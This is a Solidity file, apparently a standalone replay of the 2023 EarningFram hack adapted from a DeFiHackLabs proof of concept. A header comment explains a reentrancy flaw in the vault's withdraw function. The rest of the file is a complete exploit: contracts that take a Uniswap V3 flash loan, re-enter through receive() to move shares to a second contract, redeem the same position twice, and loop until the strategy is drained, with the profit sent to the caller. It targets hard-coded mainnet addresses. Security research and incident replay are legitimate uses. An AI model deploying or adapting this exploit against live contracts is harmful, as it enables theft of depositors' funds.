// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-08-EarningFram).
// Adapted from the DeFiHackLabs PoC (test/EarningFram_exp.sol) for the cheatcode-free
// replay engine: no forge-std/Test inheritance, no vm.* / deal() / emit log_named_*.
// The original test runs the attack loop directly on the Foundry test contract itself
// (ContractTest is Test) using a Uniswap V3 flash loan as working capital, so this uses
// the standalone-exploit-contract pattern (contract Exploit + payable exploit()
// entrypoint), matching the 2022-04-Elephant_Money synthetic shape.
//
// Root cause (EFVault.withdraw(), contracts_core_Vault.sol:91-112): the vault computes
// `shares` to burn, then calls `IController(controller).withdraw(assets, receiver)` which
// pushes redeemed NATIVE ETH straight to the caller-controlled `receiver` — BEFORE
// `_burn(msg.sender, shares)` runs. The attacker's `receive()` callback fires on that ETH
// push and transfers all-but-1 of its vault shares to a second contract (`Exploiter`)
// while control is still inside `withdraw()`. The vault's defensive clamp
// `if (balanceOf(msg.sender) < shares) shares = balanceOf(msg.sender)` then silently
// reduces the burn to 1 wei instead of reverting, so the position survives on the second
// contract and can redeem the SAME assets again. Looping this (re-funded each time by a
// flash loan) drains the ETHLeverage strategy across ~9 iterations.

import "./../interface.sol";

interface IENF_ETHLEV is IERC20 {
    function deposit(uint256 assets, address receiver) external payable returns (uint256);

    function withdraw(uint256 assets, address receiver) external returns (uint256);

    function convertToAssets(
        uint256 shares
    ) external view returns (uint256);

    function totalAssets() external view returns (uint256);
}

contract Exploit {
    IWFTM constant WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Pair_V3 constant Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IENF_ETHLEV constant ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
    address constant Controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;

    Exploiter public exploiter;

    constructor() {
        exploiter = new Exploiter();
    }

    // Entry point for recorder: loop the flash-loan-funded drain until the strategy is
    // (near) empty, then forward the accumulated WETH profit to msg.sender (the attacker).
    function exploit() external payable {
        while (ENF_ETHLEV.totalAssets() > 1 ether) {
            Pair.flash(address(this), 0, 10_000 ether, abi.encode(uint256(10_000 ether)));
        }

        uint256 profit = WETH.balanceOf(address(this));
        if (profit > 0) {
            WETH.transfer(msg.sender, profit);
        }
    }

    function uniswapV3FlashCallback(uint256, uint256 amount1, bytes calldata data) external {
        // Unwrap the flash-borrowed WETH (plus any WETH profit already parked here from a
        // prior iteration) into native ETH.
        WETH.withdraw(WETH.balanceOf(address(this)));

        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assets = ENF_ETHLEV.totalAssets();
        // Honest deposit — deposit() follows checks-effects-interactions correctly, so the
        // minted shares are real (no share-inflation trick here).
        ENF_ETHLEV.deposit{value: assets}(assets, address(this));

        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        // The vulnerable call: withdraw() pushes redeemed ETH to `receiver` (this contract)
        // via the Controller BEFORE burning shares — see receive() below.
        ENF_ETHLEV.withdraw(assetsAmount, address(this));

        // The reentrant `Exploiter` now holds the (almost) full share position that
        // `receive()` relocated to it during the callback above. Redeem it too —
        // double-spending the same shares the vault just paid out for once already.
        exploiter.withdraw();

        WETH.deposit{value: address(this).balance}();
        uint256 borrowed = abi.decode(data, (uint256));
        WETH.transfer(address(Pair), amount1 + borrowed);
    }

    // Fires mid-`ENF_ETHLEV.withdraw()`, BEFORE the vault's `_burn`. Move all-but-1 of the
    // caller's vault shares away so the vault's balance-clamp burns only 1 wei instead of
    // the full position.
    receive() external payable {
        if (msg.sender == Controller) {
            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1);
        }
    }
}

// Second contract: receives the relocated shares mid-callback and redeems them again,
// double-spending the same position within the same transaction.
contract Exploiter {
    IENF_ETHLEV constant ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);

    function withdraw() external {
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
